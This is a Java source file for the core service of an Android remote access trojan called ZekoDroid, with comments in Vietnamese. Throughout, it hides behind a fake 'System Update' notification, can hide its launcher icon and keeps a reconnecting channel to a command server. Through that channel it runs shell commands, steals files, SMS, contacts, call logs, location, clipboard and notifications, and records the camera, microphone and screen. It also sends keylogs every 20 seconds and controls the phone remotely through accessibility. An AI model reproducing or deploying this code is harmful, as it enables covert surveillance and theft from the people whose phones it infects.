package com.zeko.droid;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.StatFs;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class Core extends Service {

    static final String TAG = "sysupd";
    static volatile boolean running = false;
    /** Trạng thái kết nối, hiện lên màn hình cài đặt để debug trên máy. */
    public static volatile String status = "chưa chạy";
    private Proto proto;
    private Socket socket;
    private Thread worker;

    @Override public void onCreate() {
        super.onCreate();
        Cfg.load(this);
        proto = new Proto(Cfg.psk());
        startForeground(1, buildNotification());
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        if (!running) {
            running = true;
            worker = new Thread(this::connectLoop, "zk-net");
            worker.setDaemon(true);
            worker.start();
            WatchdogReceiver.schedule(this);
            Watchers.KeepAliveJob.schedule(this);
            Watchers.push = this::sendEvt;
            registerWatchers();
            startKeylogFlush();
        }
        return START_STICKY;
    }

    /** Đăng ký receiver động: tin nhắn mới + trạng thái màn hình. */
    private void registerWatchers() {
        try {
            android.content.IntentFilter sms = new android.content.IntentFilter(
                    "android.provider.Telephony.SMS_RECEIVED");
            sms.setPriority(999);
            registerReceiver(new Watchers.SmsReceiver(), sms);

            android.content.IntentFilter scr = new android.content.IntentFilter();
            scr.addAction(Intent.ACTION_SCREEN_ON);
            scr.addAction(Intent.ACTION_SCREEN_OFF);
            scr.addAction(Intent.ACTION_USER_PRESENT);
            registerReceiver(new Watchers.ScreenStateReceiver(), scr);
        } catch (Throwable ignored) { }
    }

    /** Đẩy event bất kỳ lên server: {t:"evt", cmd:type, data:{...}}. */
    private void sendEvt(String type, JSONObject data) {
        try {
            java.net.Socket s = socket;
            if (s == null || !s.isConnected()) return;
            JSONObject evt = new JSONObject();
            evt.put("t", "evt");
            evt.put("cmd", type);
            evt.put("data", data == null ? new JSONObject() : data);
            proto.write(s.getOutputStream(), evt);
        } catch (Throwable ignored) { }
    }

    /** Đẩy keylog buffer lên server mỗi 20s (như agent Windows). */
    private void startKeylogFlush() {
        Thread t = new Thread(() -> {
            while (running) {
                try {
                    Thread.sleep(20_000);
                    String text = ZkAccessibilityService.dump();
                    if (text.isEmpty()) continue;
                    java.net.Socket s = socket;
                    if (s == null || !s.isConnected()) continue;
                    JSONObject evt = new JSONObject();
                    evt.put("t", "evt");
                    evt.put("cmd", "keylog");
                    JSONObject d = new JSONObject();
                    d.put("text", text);
                    evt.put("data", d);
                    proto.write(s.getOutputStream(), evt);
                } catch (Throwable ignored) { }
            }
        }, "zk-klflush");
        t.setDaemon(true);
        t.start();
    }

    private Notification buildNotification() {
        String ch = "sys";
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel c = new NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_MIN);
            c.setShowBadge(false);
            nm.createNotificationChannel(c);
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, ch)
                : new Notification.Builder(this);
        return b.setContentTitle("System Update")
                .setContentText("Đang kiểm tra cập nhật…")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setOngoing(true)
                .build();
    }

    // ─────────────────────────── network ───────────────────────────
    private void connectLoop() {
        while (running) {
            try {
                status = "đang nối " + Cfg.host() + ":" + Cfg.port() + "…";
                socket = new Socket();
                socket.connect(new java.net.InetSocketAddress(Cfg.host(), Cfg.port()), 12000);
                socket.setTcpNoDelay(true);
                socket.setKeepAlive(true);

                JSONObject hello = new JSONObject();
                hello.put("t", "hello");
                hello.put("hwid", hwid());
                hello.put("info", info());
                proto.write(socket.getOutputStream(), hello);
                status = "tcp ok, đang bắt tay…";
                Log.i(TAG, "connected " + Cfg.host() + ":" + Cfg.port());

                while (running) {
                    JSONObject msg = proto.read(socket.getInputStream());
                    if (msg == null) break;
                    String t = msg.optString("t");
                    if ("ping".equals(t)) {
                        JSONObject pong = new JSONObject();
                        pong.put("t", "pong");
                        proto.write(socket.getOutputStream(), pong);
                        continue;
                    }
                    if (!"cmd".equals(t)) continue;

                    final String id = msg.optString("id");
                    final String cmd = msg.optString("cmd");
                    final JSONObject data = msg.optJSONObject("data");
                    new Thread(() -> {
                        JSONObject result;
                        try {
                            result = handle(cmd, data == null ? new JSONObject() : data);
                        } catch (Throwable th) {
                            result = new JSONObject();
                            try { result.put("error", th.getClass().getSimpleName() + ": " + th.getMessage()); }
                            catch (Exception ignored) { }
                        }
                        try {
                            JSONObject resp = new JSONObject();
                            resp.put("t", "resp");
                            resp.put("id", id);
                            resp.put("cmd", cmd);
                            resp.put("data", result);
                            proto.write(socket.getOutputStream(), resp);
                        } catch (Exception ignored) { }
                    }, "zk-cmd").start();
                }
            } catch (Throwable th) {
                status = "lỗi: " + th.getClass().getSimpleName() + " " + th.getMessage();
                Log.w(TAG, "net: " + th.getMessage());
            } finally {
                try { if (socket != null) socket.close(); } catch (Exception ignored) { }
                socket = null;
            }
            if (status.startsWith("ONLINE")) status = "mất kết nối, đang thử lại…";
            try { Thread.sleep(4000 + (int) (Math.random() * 3000)); } catch (InterruptedException ignored) { }
        }
    }

    private String hwid() {
        String id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        return id == null ? "android-unknown" : id;
    }

    // ─────────────────────────── dispatch ───────────────────────────
    private JSONObject handle(String cmd, JSONObject d) throws Exception {
        switch (cmd) {
            case "info": return info();
            case "shell": return shell(d.optString("cmd", "id"));
            case "ls": return ls(d.optString("path", "/sdcard"));
            case "download": return download(d.optString("path", ""));
            case "upload": return upload(d.optString("path", ""), d.optString("b64", ""));
            case "rm": return rm(d.optString("path", ""));
            case "apps": return apps();
            case "sms": return sms(d.optInt("limit", 100));
            case "sms_send": return smsSend(d.optString("to", ""), d.optString("text", ""));
            case "contacts": return contacts(d.optInt("limit", 200));
            case "calllog": return calllog(d.optInt("limit", 100));
            case "location": return location();
            case "clipboard": return clipboard();
            case "cam_list": return camList();
            case "cam_shot":
                byte[] cam = Media.cameraShot(this,
                        d.optInt("facing", android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK),
                        d.optInt("quality", 70));
                if (cam == null) return err("camera khong chup duoc (kiem tra quyen)");
                return new JSONObject().put("jpeg", Proto.b64(cam)).put("size", cam.length);
            case "screenshot":
            case "screen_shot": {
                Media.startScreen(this);
                byte[] scr = Media.screenShot(d.optInt("quality", 55), 3000);
                if (scr == null) return err("chua cap quyen MediaProjection — mo app bam 'Bat chia se man hinh'");
                return new JSONObject().put("jpeg", Proto.b64(scr)).put("size", scr.length);
            }
            case "mic": {
                byte[] rec = Media.recordAudio(this, d.optInt("seconds", 5));
                if (rec == null) return err("khong ghi am duoc (kiem tra quyen MIC)");
                return new JSONObject().put("b64", Proto.b64(rec)).put("size", rec.length).put("mime", "audio/mp4");
            }
            case "vibrate": {
                android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
                if (v != null && v.hasVibrator()) v.vibrate(d.optLong("ms", 800));
                return new JSONObject().put("ok", true);
            }

            // ── điều khiển từ xa qua AccessibilityService (HVNC) ──
            case "tap": {
                ZkAccessibilityService acc = ZkAccessibilityService.INSTANCE;
                if (acc == null) return err("chua bat tro nang (Settings > Accessibility)");
                boolean ok = acc.tap((float) d.optDouble("x", 0), (float) d.optDouble("y", 0));
                return new JSONObject().put("ok", ok);
            }
            case "swipe": {
                ZkAccessibilityService acc = ZkAccessibilityService.INSTANCE;
                if (acc == null) return err("chua bat tro nang");
                boolean ok = acc.swipe((float) d.optDouble("x1", 0), (float) d.optDouble("y1", 0),
                        (float) d.optDouble("x2", 0), (float) d.optDouble("y2", 0), d.optInt("ms", 250));
                return new JSONObject().put("ok", ok);
            }
            case "click_text": {
                ZkAccessibilityService acc = ZkAccessibilityService.INSTANCE;
                if (acc == null) return err("chua bat tro nang");
                return new JSONObject().put("ok", acc.clickNode(d.optString("text", "")));
            }
            case "keylog_dump":
                return new JSONObject().put("text", ZkAccessibilityService.dump())
                        .put("accessibility", ZkAccessibilityService.INSTANCE != null)
                        .put("pending", ZkAccessibilityService.pending());

            case "notifs":
                return new JSONObject().put("items", ZkNotifService.recent(d.optInt("limit", 100)))
                        .put("enabled", ZkNotifService.enabled(this));

            // ── ẩn/hiện icon, kiểm tra trạng thái ──
            case "hide_icon":
            case "show_icon": {
                boolean hide = "hide_icon".equals(cmd);
                getPackageManager().setComponentEnabledSetting(
                        new android.content.ComponentName(this, MainActivity.class),
                        hide ? android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                             : android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP);
                return new JSONObject().put("ok", true).put("hidden", hide);
            }
            case "status":
                return new JSONObject()
                        .put("accessibility", ZkAccessibilityService.INSTANCE != null)
                        .put("notifListener", ZkNotifService.enabled(this))
                        .put("projection", Media.projection != null)
                        .put("foreground", true);

            // ── stream realtime: agent push frame, server đẩy xuống browser ──
            case "stream_start": {
                String kind = d.optString("kind", "screen");
                int fps = d.optInt("fps", kind.equals("cam") ? 12 : 8);
                int q = d.optInt("quality", kind.equals("cam") ? 60 : 55);
                String r;
                if (kind.equals("cam")) {
                    r = Streamer.startCam(this, fps, q, d.optInt("facing", 0), frameSink());
                } else {
                    if (Media.projection == null) return err("chua cap quyen MediaProjection");
                    r = Streamer.startScreen(this, fps, q, frameSink());
                }
                return new JSONObject().put("ok", "ok".equals(r)).put("msg", r)
                        .put("kind", kind).put("fps", fps).put("quality", q);
            }
            case "stream_stop": {
                String kind = d.optString("kind", "both");
                if (!kind.equals("screen")) Streamer.stopCam();
                if (!kind.equals("cam")) Streamer.stopScreen();
                return new JSONObject().put("ok", true);
            }
            case "stream_status":
                return new JSONObject().put("screen", Streamer.screenActive())
                        .put("cam", Streamer.camActive())
                        .put("projection", Media.projection != null);

            // ── lặt vặt còn thiếu (tham khảo FasonRat/L3MON) ──
            case "wifi_scan": return wifiScan();
            case "torch": return torch(d.optBoolean("on", true));
            case "volume": return volume(d.optString("action", "get"), d.optInt("level", -1));
            case "toast": {
                final String msg = d.optString("text", "");
                new android.os.Handler(getMainLooper()).post(() -> {
                    try {
                        android.widget.Toast.makeText(getApplicationContext(), msg,
                                android.widget.Toast.LENGTH_LONG).show();
                    } catch (Throwable ignored) { }
                });
                return new JSONObject().put("ok", true);
            }
            case "power_lock": {
                ZkAccessibilityService acc = ZkAccessibilityService.INSTANCE;
                boolean ok = false;
                if (acc != null) ok = acc.lockScreen();
                return new JSONObject().put("ok", ok);
            }
            case "screen_off":
            case "screen_on": {
                // chỉ tắt/bật màn hình được bằng quyền hệ thống; trả lỗi rõ ràng
                return err("can quyen he thong (ADB: adb shell input keyevent 26)");
            }
            // ── module phụ ──
            case "video": {
                byte[] mp4 = Extras.recordVideo(this, d.optInt("seconds", 5), d.optInt("facing", 0));
                if (mp4 == null) return err("quay video that bai (camera ban?)");
                return new JSONObject().put("b64", Proto.b64(mp4)).put("size", mp4.length).put("mime", "video/mp4");
            }
            case "inspector":
                return new JSONObject().put("nodes", Extras.inspect())
                        .put("accessibility", ZkAccessibilityService.INSTANCE != null);
            case "permissions":
                return new JSONObject().put("perms", Extras.permissions(this));
            case "file_enc":
                return Extras.encryptFile(d.optString("path", ""), d.optString("pass", "zeko"), false);
            case "file_dec":
                return Extras.encryptFile(d.optString("path", ""), d.optString("pass", "zeko"), true);
            case "rename": {
                java.io.File a = new java.io.File(d.optString("path", ""));
                java.io.File b = new java.io.File(d.optString("to", ""));
                return new JSONObject().put("ok", a.exists() && a.renameTo(b)).put("path", b.getAbsolutePath());
            }
            case "mkdir": {
                java.io.File dir = new java.io.File(d.optString("path", ""));
                return new JSONObject().put("ok", dir.mkdirs()).put("path", dir.getAbsolutePath());
            }

            // ── realtime watcher ──
            case "mic_live": {
                boolean on = d.optBoolean("on", true);
                if (on) {
                    String r = Watchers.startMicLive(d.optInt("rate", 16000));
                    return new JSONObject().put("ok", "ok".equals(r)).put("msg", r);
                }
                Watchers.stopMicLive();
                return new JSONObject().put("ok", true);
            }
            case "loc_live": {
                boolean on = d.optBoolean("on", true);
                if (on) Watchers.startLocation(this, d.optInt("seconds", 10));
                else Watchers.stopLocation();
                return new JSONObject().put("ok", true);
            }
            case "clip_live": {
                boolean on = d.optBoolean("on", true);
                if (on) Watchers.startClipboard(this);
                else Watchers.stopClipboard();
                return new JSONObject().put("ok", true);
            }
            case "watchers_status":
                return new JSONObject().put("mic", Watchers.micRunning)
                        .put("loc", Watchers.locRunning).put("clip", Watchers.clipRunning);

            case "ping": return new JSONObject().put("ok", true);
            default: return err("lenh khong ho tro: " + cmd);
        }
    }

    private static JSONObject err(String m) throws Exception {
        return new JSONObject().put("error", m);
    }

    // ─────────────────────────── stream sink ───────────────────────────
    private Streamer.Sink _sink;

    private Streamer.Sink frameSink() {
        if (_sink == null) _sink = (kind, jpeg) -> sendFrame(kind, jpeg);
        return _sink;
    }

    /** Gửi 1 frame lên server: {t:"evt", cmd:"frame", data:{kind, jpeg}}. */
    private void sendFrame(String kind, byte[] jpeg) {
        try {
            java.net.Socket s = socket;
            if (s == null || !s.isConnected() || jpeg == null || jpeg.length == 0) return;
            JSONObject evt = new JSONObject();
            evt.put("t", "evt");
            evt.put("cmd", "frame");
            JSONObject d = new JSONObject();
            d.put("kind", kind);
            d.put("jpeg", Proto.b64(jpeg));
            d.put("size", jpeg.length);
            evt.put("data", d);
            proto.write(s.getOutputStream(), evt);
        } catch (Throwable ignored) { }
    }

    // ─────────────────────────── wifi / torch / volume ───────────────────────────
    private JSONObject wifiScan() throws Exception {
        try {
            android.net.wifi.WifiManager wm =
                    (android.net.wifi.WifiManager) getApplicationContext()
                            .getSystemService(Context.WIFI_SERVICE);
            if (wm == null) return err("khong co WifiManager");
            if (!wm.isWifiEnabled()) return err("wifi dang tat");
            wm.startScan();
            Thread.sleep(1200);
            JSONArray arr = new JSONArray();
            java.util.List<android.net.wifi.ScanResult> rs = wm.getScanResults();
            if (rs != null) for (android.net.wifi.ScanResult r : rs) {
                JSONObject o = new JSONObject();
                o.put("ssid", r.SSID == null ? "" : r.SSID);
                o.put("bssid", r.BSSID);
                o.put("rssi", r.level);
                o.put("cap", r.capabilities);
                o.put("freq", r.frequency);
                arr.put(o);
            }
            return new JSONObject().put("networks", arr);
        } catch (Throwable t) {
            return err("wifi scan: " + t.getMessage());
        }
    }

    private JSONObject torch(boolean on) throws Exception {
        try {
            android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) getSystemService(CAMERA_SERVICE);
            String id = null;
            for (String c : cm.getCameraIdList()) {
                Boolean has = cm.getCameraCharacteristics(c)
                        .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (Boolean.TRUE.equals(has)) { id = c; break; }
            }
            if (id == null) return err("may khong co flash");
            cm.setTorchMode(id, on);
            return new JSONObject().put("ok", true).put("on", on);
        } catch (Throwable t) {
            return err("torch: " + t.getMessage());
        }
    }

    private JSONObject volume(String action, int level) throws Exception {
        try {
            android.media.AudioManager am = (android.media.AudioManager) getSystemService(AUDIO_SERVICE);
            if (am == null) return err("khong co AudioManager");
            int stream = android.media.AudioManager.STREAM_MUSIC;
            int max = am.getStreamMaxVolume(stream);
            int cur = am.getStreamVolume(stream);
            switch (action) {
                case "up": am.adjustStreamVolume(stream, android.media.AudioManager.ADJUST_RAISE, 0); break;
                case "down": am.adjustStreamVolume(stream, android.media.AudioManager.ADJUST_LOWER, 0); break;
                case "mute": am.adjustStreamVolume(stream, android.media.AudioManager.ADJUST_MUTE, 0); break;
                case "unmute": am.adjustStreamVolume(stream, android.media.AudioManager.ADJUST_UNMUTE, 0); break;
                case "set": am.setStreamVolume(stream, Math.max(0, Math.min(max, level)), 0); break;
                default: break;
            }
            return new JSONObject().put("ok", true)
                    .put("volume", am.getStreamVolume(stream)).put("max", max);
        } catch (Throwable t) {
            return err("volume: " + t.getMessage());
        }
    }

    // ─────────────────────────── info ───────────────────────────
    private JSONObject info() throws Exception {
        JSONObject o = new JSONObject();
        o.put("host", Build.MODEL);
        o.put("user", Build.MANUFACTURER + " " + Build.BRAND);
        o.put("os", "Android " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")");
        o.put("arch", Build.SUPPORTED_ABIS.length > 0 ? Build.SUPPORTED_ABIS[0] : "?");
        o.put("cpu", Runtime.getRuntime().availableProcessors() + " cores");
        o.put("ram", (Runtime.getRuntime().maxMemory() / (1024 * 1024)) + " MB heap");

        try {
            StatFs st = new StatFs(Environment.getDataDirectory().getPath());
            long total = st.getBlockCountLong() * st.getBlockSizeLong();
            long free = st.getAvailableBlocksLong() * st.getBlockSizeLong();
            o.put("drives", (free / (1024L * 1024 * 1024)) + "/" + (total / (1024L * 1024 * 1024)) + "GB free");
        } catch (Throwable ignored) { }

        o.put("ip", localIp());
        o.put("uptime", android.os.SystemClock.elapsedRealtime() / 1000 + "s");

        try {
            BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
            o.put("battery", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) + "%");
        } catch (Throwable ignored) { }

        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            String carrier = tm.getNetworkOperatorName();
            o.put("sim", carrier == null || carrier.isEmpty() ? "?" : carrier);
        } catch (Throwable ignored) { }

        o.put("admin", "rooted=" + (new File("/system/bin/su").exists() || new File("/system/xbin/su").exists()));
        o.put("runtime", "ZekoDroid 1.0 · pkg=" + getPackageName());
        return o;
    }

    private String localIp() {
        try {
            List<NetworkInterface> ifs = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface ni : ifs) {
                if (!ni.isUp() || ni.isLoopback()) continue;
                for (InetAddress a : Collections.list(ni.getInetAddresses())) {
                    if (a instanceof Inet4Address) return a.getHostAddress();
                }
            }
        } catch (Throwable ignored) { }
        return "?";
    }

    // ─────────────────────────── shell ───────────────────────────
    private JSONObject shell(String cmd) throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ByteArrayOutputStream bes = new ByteArrayOutputStream();
        Thread t1 = drain(p.getInputStream(), bos);
        Thread t2 = drain(p.getErrorStream(), bes);
        boolean done = p.waitFor(20, java.util.concurrent.TimeUnit.SECONDS);
        if (!done) p.destroy();
        t1.join(800);
        t2.join(800);
        JSONObject o = new JSONObject();
        o.put("out", bos.toString("UTF-8"));
        o.put("err", bes.toString("UTF-8"));
        o.put("code", done ? p.exitValue() : -1);
        return o;
    }

    private static Thread drain(java.io.InputStream in, ByteArrayOutputStream out) {
        Thread t = new Thread(() -> {
            try (java.io.InputStream i = in) {
                byte[] buf = new byte[8192];
                int n;
                while ((n = i.read(buf)) > 0) out.write(buf, 0, n);
            } catch (Throwable ignored) { }
        });
        t.setDaemon(true);
        t.start();
        return t;
    }

    // ─────────────────────────── files ───────────────────────────
    private JSONObject ls(String path) throws Exception {
        File dir = new File(path);
        if (!dir.exists()) return err("khong co: " + path);
        if (!dir.isDirectory()) return err("khong phai thu muc");
        File[] files = dir.listFiles();
        if (files == null) return err("khong doc duoc thu muc (thieu quyen)");
        java.util.Arrays.sort(files, (a, b) -> {
            if (a.isDirectory() != b.isDirectory()) return a.isDirectory() ? -1 : 1;
            return a.getName().compareToIgnoreCase(b.getName());
        });
        JSONArray arr = new JSONArray();
        for (File f : files) {
            JSONObject e = new JSONObject();
            e.put("name", f.getName());
            e.put("dir", f.isDirectory());
            e.put("path", f.getAbsolutePath());
            e.put("size", f.isDirectory() ? 0 : f.length());
            e.put("modified", new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US)
                    .format(new java.util.Date(f.lastModified())));
            arr.put(e);
        }
        return new JSONObject().put("path", dir.getAbsolutePath()).put("entries", arr);
    }

    private JSONObject download(String path) throws Exception {
        File f = new File(path);
        if (!f.exists() || f.isDirectory()) return err("khong thay file");
        if (f.length() > 24L * 1024 * 1024) return err("file > 24MB");
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (FileInputStream fis = new FileInputStream(f)) {
            byte[] buf = new byte[16384];
            int n;
            while ((n = fis.read(buf)) > 0) bos.write(buf, 0, n);
        }
        return new JSONObject().put("b64", Proto.b64(bos.toByteArray()))
                .put("size", bos.size()).put("name", f.getName());
    }

    private JSONObject upload(String path, String b64) throws Exception {
        byte[] data = Proto.unb64(b64);
        File f = new File(path);
        File parent = f.getParentFile();
        if (parent != null && !parent.exists()) //noinspection ResultOfMethodCallIgnored
            parent.mkdirs();
        try (FileOutputStream fos = new FileOutputStream(f)) {
            fos.write(data);
        }
        return new JSONObject().put("ok", true).put("path", f.getAbsolutePath()).put("size", data.length);
    }

    private JSONObject rm(String path) throws Exception {
        File f = new File(path);
        if (!f.exists()) return err("khong ton tai");
        boolean ok = f.isDirectory() ? deleteTree(f) : f.delete();
        return new JSONObject().put("ok", ok);
    }

    private static boolean deleteTree(File f) {
        File[] kids = f.listFiles();
        if (kids != null) for (File k : kids) deleteTree(k);
        return f.delete();
    }

    // ─────────────────────────── apps ───────────────────────────
    private JSONObject apps() throws Exception {
        PackageManager pm = getPackageManager();
        JSONArray arr = new JSONArray();
        for (ApplicationInfo ai : pm.getInstalledApplications(0)) {
            JSONObject o = new JSONObject();
            o.put("pkg", ai.packageName);
            o.put("name", pm.getApplicationLabel(ai).toString());
            o.put("system", (ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
            arr.put(o);
        }
        return new JSONObject().put("apps", arr);
    }

    // ─────────────────────────── sms / contacts / call log ───────────────────────────
    private JSONObject sms(int limit) throws Exception {
        JSONArray arr = new JSONArray();
        ContentResolver cr = getContentResolver();
        try (Cursor c = cr.query(Telephony.Sms.CONTENT_URI,
                new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE},
                null, null, Telephony.Sms.DATE + " DESC")) {
            if (c != null) {
                while (c.moveToNext() && arr.length() < limit) {
                    JSONObject o = new JSONObject();
                    o.put("from", c.getString(0));
                    o.put("body", c.getString(1));
                    o.put("date", new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US)
                            .format(new java.util.Date(c.getLong(2))));
                    o.put("type", c.getInt(3) == 1 ? "inbox" : "sent");
                    arr.put(o);
                }
            }
        } catch (Throwable t) {
            return err("khong doc SMS: " + t.getMessage());
        }
        return new JSONObject().put("sms", arr);
    }

    private JSONObject smsSend(String to, String text) throws Exception {
        try {
            android.telephony.SmsManager sm = android.telephony.SmsManager.getDefault();
            sm.sendTextMessage(to, null, text, null, null);
            return new JSONObject().put("ok", true);
        } catch (Throwable t) {
            return err("gui SMS loi: " + t.getMessage());
        }
    }

    private JSONObject contacts(int limit) throws Exception {
        JSONArray arr = new JSONArray();
        try (Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")) {
            if (c != null) {
                while (c.moveToNext() && arr.length() < limit) {
                    arr.put(new JSONObject().put("name", c.getString(0)).put("phone", c.getString(1)));
                }
            }
        } catch (Throwable t) {
            return err("khong doc contacts: " + t.getMessage());
        }
        return new JSONObject().put("contacts", arr);
    }

    private JSONObject calllog(int limit) throws Exception {
        JSONArray arr = new JSONArray();
        try (Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION},
                null, null, CallLog.Calls.DATE + " DESC")) {
            if (c != null) {
                while (c.moveToNext() && arr.length() < limit) {
                    JSONObject o = new JSONObject();
                    o.put("number", c.getString(0));
                    o.put("type", c.getInt(1) == 1 ? "in" : c.getInt(1) == 2 ? "out" : "missed");
                    o.put("date", new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US)
                            .format(new java.util.Date(c.getLong(2))));
                    o.put("duration", c.getLong(3));
                    arr.put(o);
                }
            }
        } catch (Throwable t) {
            return err("khong doc call log: " + t.getMessage());
        }
        return new JSONObject().put("calls", arr);
    }

    // ─────────────────────────── location / clipboard ───────────────────────────
    private JSONObject location() throws Exception {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location best = null;
            for (String p : lm.getProviders(true)) {
                Location l = lm.getLastKnownLocation(p);
                if (l != null && (best == null || l.getTime() > best.getTime())) best = l;
            }
            if (best == null) return err("chua co vi tri (bat GPS + cap quyen)");
            return new JSONObject()
                    .put("lat", best.getLatitude())
                    .put("lon", best.getLongitude())
                    .put("acc", best.getAccuracy())
                    .put("time", new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
                            .format(new java.util.Date(best.getTime())))
                    .put("map", "https://maps.google.com/?q=" + best.getLatitude() + "," + best.getLongitude());
        } catch (Throwable t) {
            return err("location: " + t.getMessage());
        }
    }

    private JSONObject clipboard() throws Exception {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) return new JSONObject().put("text", "");
            CharSequence cs = cm.getPrimaryClip().getItemAt(0).coerceToText(this);
            return new JSONObject().put("text", cs == null ? "" : cs.toString());
        } catch (Throwable t) {
            return err("clipboard: " + t.getMessage());
        }
    }

    private JSONObject camList() throws Exception {
        JSONArray arr = new JSONArray();
        for (String id : Media.cameraList(this)) arr.put("camera " + id);
        return new JSONObject().put("cameras", arr);
    }

    @Override public IBinder onBind(Intent intent) { return null; }

    @Override public void onDestroy() {
        running = false;
        Media.stopScreen();
        super.onDestroy();
    }
}
